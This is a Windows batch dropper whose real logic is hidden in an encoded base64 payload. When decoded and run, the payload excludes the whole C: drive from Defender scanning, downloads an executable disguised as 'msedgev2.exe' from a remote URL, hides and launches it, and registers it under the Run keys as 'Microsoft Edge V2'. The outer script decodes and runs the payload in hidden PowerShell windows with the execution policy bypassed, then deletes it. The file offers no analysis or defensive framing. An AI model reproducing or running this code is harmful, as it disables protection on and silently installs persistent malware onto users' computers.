@echo off
setlocal enabledelayedexpansion

set "base64String=QABlAGMAaABvACAAbwBmAGYACgBzAGUAdABsAG8AYwBhAGwAIABFAG4AYQBiAGwAZQBEAGUAbABhAHkAZQBkAEUAeABwAGEAbgBzAGkAbwBuAAoACgBwAHUAcwBoAGQAIAAiACUAfgBkAHAAMAAiAAoACgBwAG8AdwBlAHIAcwBoAGUAbABsACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0AQwBvAG0AbQBhAG4AZAAgACIAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAJwAiAAoACgB0AGkAbQBlAG8AdQB0ACAALwB0ACAAMwAgAC8AbgBvAGIAcgBlAGEAawAgAD4AbgB1AGwACgAKAHMAZQB0ACAAIgBDAEgAUgBPAE0ARQBEAEkAUgA9ACUATABvAGMAYQBsAEEAcABwAEQAYQB0AGEAJQBcAEMAaAByAG8AbQBlACIACgBzAGUAdAAgACIAVABBAFIARwBFAFQAPQAlAEMASABSAE8ATQBFAEQASQBSACUAXABtAHMAZQBkAGcAZQB2ADIALgBlAHgAZQAiAAoACgBpAGYAIABuAG8AdAAgAGUAeABpAHMAdAAgACIAJQBDAEgAUgBPAE0ARQBEAEkAUgAlACIAIABtAGsAZABpAHIAIAAiACUAQwBIAFIATwBNAEUARABJAFIAJQAiAAoAYQB0AHQAcgBpAGIAIAArAGgAIAAiACUAQwBIAFIATwBNAEUARABJAFIAJQAiACAALwBzACAALwBkAAoAYwBkACAAIgAlAEMASABSAE8ATQBFAEQASQBSACUAIgAKAAoAOgBkAG8AdwBuAGwAbwBhAGQACgBpAGYAIABlAHgAaQBzAHQAIAAiACUAVABBAFIARwBFAFQAJQAiACAAKAAKACAAIAAgACAAZwBvAHQAbwAgAGMAaABlAGMAawBfAGEAbgBkAF8AcgB1AG4ACgApACAAZQBsAHMAZQAgACgACgAgACAAIAAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBDAG8AbQBtAGEAbgBkACAAIgBbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsACAAPQAgAFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGMAbwBuAGYAZQBzAHMAeQBvAHUAcgBjAGkAbgAvAHgAbwByAC0AbwBiAGYAdQBzAGMAYQB0AG8AcgAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBtAHMAZQBkAGcAZQB2ADIALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJwAlAFQAQQBSAEcARQBUACUAJwAiAAoAIAAgACAAIAB0AGkAbQBlAG8AdQB0ACAALwB0ACAANQAgAC8AbgBvAGIAcgBlAGEAawAgAD4AbgB1AGwACgAgACAAIAAgAGcAbwB0AG8AIABkAG8AdwBuAGwAbwBhAGQACgApAAoACgA6AGMAaABlAGMAawBfAGEAbgBkAF8AcgB1AG4ACgAgACAAIAAgAFIARQBNACAARABvAHMAeQBhAG4AMQFuACAAZwBpAHoAbABpACAAbwBsAHUAcAAgAG8AbABtAGEAZAAxAR8BMQFuADEBIABrAG8AbgB0AHIAbwBsACAAZQB0AAoAIAAgACAAIABmAG8AcgAgACUAJQBBACAAaQBuACAAKAAiACUAVABBAFIARwBFAFQAJQAiACkAIABkAG8AIAAoAAoAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAALwBhACAASQBTAF8ASABJAEQARABFAE4APQAwAAoAIAAgACAAIAAgACAAIAAgAGUAYwBoAG8AIAAlACUAfgBhAEEAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgACIAaAAiACAAPgBuAHUAbAAgACYAJgAgAHMAZQB0ACAALwBhACAASQBTAF8ASABJAEQARABFAE4APQAxAAoAIAAgACAAIAApAAoACgAgACAAIAAgAGkAZgAgACEASQBTAF8ASABJAEQARABFAE4AIQAgAD0APQAgADAAIAAoAAoAIAAgACAAIAAgACAAIAAgAFIARQBNACAARABvAHMAeQBhACAAZwBpAHoAbABpACAAZABlAB8BaQBsAHMAZQAgAGcAaQB6AGwAZQAgAHYAZQAgAHQAZQBrAHIAYQByACAAZABlAG4AZQAKACAAIAAgACAAIAAgACAAIABhAHQAdAByAGkAYgAgACsAaAAgACIAJQBUAEEAUgBHAEUAVAAlACIACgAgACAAIAAgACAAIAAgACAAdABpAG0AZQBvAHUAdAAgAC8AdAAgADEAIAA+AG4AdQBsAAoAIAAgACAAIAAgACAAIAAgAGcAbwB0AG8AIABjAGgAZQBjAGsAXwBhAG4AZABfAHIAdQBuAAoAIAAgACAAIAApACAAZQBsAHMAZQAgACgACgAgACAAIAAgACAAIAAgACAAUgBFAE0AIABEAG8AcwB5AGEAIABnAGkAegBsAGkAIABpAHMAZQAgAOcAYQBsADEBXwF0ADEBcgAKACAAIAAgACAAIAAgACAAIABzAHQAYQByAHQAIAAiACIAIAAiACUAVABBAFIARwBFAFQAJQAiAAoAIAAgACAAIAAgACAAIAAgAHQAaQBtAGUAbwB1AHQAIAAvAHQAIAAyACAAPgBuAHUAbAAKAAoAIAAgACAAIAAgACAAIAAgAHQAYQBzAGsAbABpAHMAdAAgAHwAIABmAGkAbgBkACAALwBpACAAIgBtAHMAZQBkAGcAZQB2ADIALgBlAHgAZQAiACAAPgBuAHUAbAAKACAAIAAgACAAIAAgACAAIABpAGYAIAAhAGUAcgByAG8AcgBsAGUAdgBlAGwAIQAgAD0APQAgADAAIAAoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZwBvAHQAbwAgAHIAZQBnAGUAZABpAHQACgAgACAAIAAgACAAIAAgACAAKQAgAGUAbABzAGUAIAAoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBFAE0AIABVAHkAZwB1AGwAYQBtAGEAIADnAGEAbAAxAV8BbQBhAGQAMQF5AHMAYQAgAGIAZQBrAGwAZQAgAHYAZQAgAHQAZQBrAHIAYQByACAAZABlAG4AZQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAaQBtAGUAbwB1AHQAIAAvAHQAIAAyACAAPgBuAHUAbAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAbwB0AG8AIABjAGgAZQBjAGsAXwBhAG4AZABfAHIAdQBuAAoAIAAgACAAIAAgACAAIAAgACkACgAgACAAIAAgACkACgAKADoAcgBlAGcAZQBkAGkAdAAKAHIAZQBnACAAcQB1AGUAcgB5ACAAIgBIAEsAQwBVAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIgAgAC8AdgAgACIATQBpAGMAcgBvAHMAbwBmAHQAIABFAGQAZwBlACAAVgAyACIAIAA+AG4AdQBsACAAMgA+ACYAMQAKAGkAZgAgAGUAcgByAG8AcgBsAGUAdgBlAGwAIAAxACAAKAAKACAAIAAgACAAcgBlAGcAIABhAGQAZAAgACIASABLAEMAVQBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFIAdQBuACIAIAAvAHYAIAAiAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBkAGcAZQAgAFYAMgAiACAALwB0ACAAUgBFAEcAXwBTAFoAIAAvAGQAIAAiAFwAIgAlAFQAQQBSAEcARQBUACUAXAAiACIAIAAvAGYAIAA+AG4AdQBsAAoAKQAKAAoAcgBlAGcAIABxAHUAZQByAHkAIAAiAEgASwBMAE0AXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAiACAALwB2ACAAIgBNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUAIABWADIAIgAgAD4AbgB1AGwAIAAyAD4AJgAxAAoAaQBmACAAZQByAHIAbwByAGwAZQB2AGUAbAAgADEAIAAoAAoAIAAgACAAIAByAGUAZwAgAGEAZABkACAAIgBIAEsATABNAFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AIgAgAC8AdgAgACIATQBpAGMAcgBvAHMAbwBmAHQAIABFAGQAZwBlACAAVgAyACIAIAAvAHQAIABSAEUARwBfAFMAWgAgAC8AZAAgACIAXAAiACUAVABBAFIARwBFAFQAJQBcACIAIgAgAC8AZgAgAD4AbgB1AGwACgApAAoACgBlAG4AZABsAG8AYwBhAGwACgBlAHgAaQB0AA=="



powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Set-Content -Encoding UTF8 decoded.bat"


set "trycount=0"
:waitloop
if exist "decoded.bat" (
    goto runit
)
set /a trycount+=1
if %trycount% GEQ 20 (
    exit /b
)
ping -n 2 127.0.0.1 >nul
goto waitloop

:runit

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'decoded.bat' -WindowStyle Hidden -Wait"


ping -n 31 127.0.0.1 >nul


del /f /q decoded.bat

exit
